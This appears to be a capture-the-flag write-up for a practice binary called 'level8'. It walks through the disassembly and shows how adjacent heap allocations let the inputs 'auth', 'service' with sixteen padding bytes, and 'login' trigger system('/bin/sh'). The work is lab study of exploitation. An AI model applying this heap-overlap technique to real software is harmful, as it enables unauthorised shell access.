@@ -1,0 +1,152 @@
+## overview to the program
+
+the program has a while loop that content a printf function that display the the two global variables `auth` and `service` and then it calls the function `fgets` that reads the input from the user and store it in the buffer.
+
+printf with the two global variables auth and service :
+
+```bash
+mov    0x8049ab0,%ecx        ; ecx = service
+mov    0x8049aac,%edx        ; edx = auth
+mov    $0x8048810,%eax       ; eax = format string
+
+mov    %ecx,0x8(%esp)        ; 3rd argument
+mov    %edx,0x4(%esp)        ; 2nd argument
+mov    %eax,(%esp)           ; 1st argument
+
+call   printf@plt
+```
+the function fgets that reads the input from the user and store it in the buffer:
+
+```bash
+mov    $0x8049a90,%eax       ; eax = buffer
+mov    $0x200,%edx          ; edx = 512
+mov    %eax,0x4(%esp)        ; 2nd argument
+mov    %edx,(%esp)           ; 1st argument
+call   fgets@plt
+```
+
+after that we found that the program calling into a while loop that check if the buffer is equal to some stings in a condition and if it is equal to one of the strings it will enter into the if statement.
+
+but the if statement is interesting here is 
+
+```bash
+0x080486b5 <+337>: lea    0x20(%esp), %eax    ; eax = &buffer
+0x080486b9 <+341>: mov    %eax, %edx
+0x080486bb <+343>: mov    $0x804882d, %eax    ; address of "login"
+0x080486c0 <+348>: mov    $0x5, %ecx          ; compare 5 bytes
+0x080486c5 <+353>: mov    %edx, %esi          ; esi = buffer
+0x080486c7 <+355>: mov    %eax, %edi          ; edi = "login"
+0x080486c9 <+357>: repz cmpsb                ; compare bytes
+0x080486cb <+359>: seta   %dl
+0x080486ce <+362>: setb   %al
+0x080486d1 <+365>: mov    %edx, %ecx
+0x080486d3 <+367>: sub    %al, %cl
+0x080486d5 <+369>: mov    %ecx, %eax
+0x080486d7 <+371>: movsbl %al, %eax
+0x080486da <+374>: test   %eax, %eax
+0x080486dc <+376>: jne    0x08048574         ; if not equal, jump away
+```
+cause this is guide us to the next step that when it has another if statement the first if check if `auth + 32` is not equal to `0` and the second is else that print the string `Password:\n`.
+
+the interesting part is that the first if statement check if `auth + 32` is not equal to `0` cause it has a calling of function `system` with argument `/bin/sh`.
+
+```bash
+0x080486e2 <+382>: mov    0x8049aac,%eax    ; eax = auth
+0x080486e7 <+387>: mov    0x20(%eax),%eax   ; eax = auth + 32 
+0x080486ea <+390>: test   %eax,%eax         ; test if auth + 32 is not equal to 0
+0x080486ec <+392>: je     0x080486ff        ; if equal jump to the else statement
+0x080486ee <+394>: movl   $0x8048833,(%esp)         ; argument = "/bin/sh"
+0x080486f5 <+401>: call   0x8048480 <system@plt>    ; call system("/bin/sh")
+```
+
+## What the condition really means
+
+```bash
+*(int *)(auth + 32) != 0
+```
+It means that the program is going to check if the value at the memory address `auth + 32` is not equal to zero.
+
+## key to the exploitation
+
+now we now there is a way to get the shell by entring to the conditions statment.
+
+To execute system("/bin/sh"), two things must be true:
+
+1 - auth must point to valid memory (it must not be NULL).
+2 - The 4-byte integer located at offsets auth + 32 through auth + 35 must be non-zero.
+
+it's like that, we Assume auth points to address 0x1000
+
+```bash
+                    auth
+                      │
+                      ▼
+           Address    Contents
+           ──────────────────────────────────
+0x1000 ──► +------------------------------+
+           | Byte 0                       |
+0x1001     +------------------------------+
+           | Byte 1                       |
+0x1002     +------------------------------+
+           | Byte 2                       |
+0x1003     +------------------------------+
+           | Byte 3                       |
+           |            ...               |
+           |            ...               |
+0x101F     +------------------------------+
+           | Byte 31                      |
+0x1020 ──► +------------------------------+
+           | Byte 32                      | ←\
+0x1021     +------------------------------+   |
+           | Byte 33                      |   | 4 bytes interpreted
+0x1022     +------------------------------+   | as one `int`
+           | Byte 34                      |   |
+0x1023     +------------------------------+ ←/
+           | Byte 35                      |
+           +------------------------------+
+
+```
+
+we can bypass the first condition by making the program enter into the first if statement by making the value of `auth` to be a valid memory address
+
+in this if statement there is : 
+
+```bash
+0x080485eb <+135>:   call   0x8048470 <malloc@plt> ;   call malloc to allocate memory and return a pointer to it in eax
+```
+
+and the second condition can be bypassed by making the value of `auth + 32` to be non-zero, here we found a solution to the problem it by using the command of `service` that it make a call to the function `strdup` and return the pointer to  `service` the global variable.
+after do that the heap will be like that:
+
+```bash
+ 0x804a008 ──► +------------------+      0x804a018 ──► +------------------+
+              | auth chunk (4B)  |                    | service chunk     |
+              | 00 00 00 00      |                    | "AAA ... \0"      |
+              +------------------+                    +-------------------+
+```
+but there is something important to know in the heap allocation, in this case we found
+
+auth starts at      0x804a008
+service starts at   0x804a018
+difference =        16 bytes // 0x804a008 - 0x804a018 = 0x10 = 16 bytes
+
+4 bytes  → auth's user data
+12 bytes → allocator-managed space (metadata/alignment)
+16 bytes → total distance
+
+that mean we need just another 16 bytes to make the if statement true and run the system("/bin/sh") command.
+
+here is the final solution to the problem:
+
+```bash
+./level8
+
+auth 
+
+service AAAAAAAAAAAAAAAA
+
+login
+
+```
+
+after that we will get the shell.
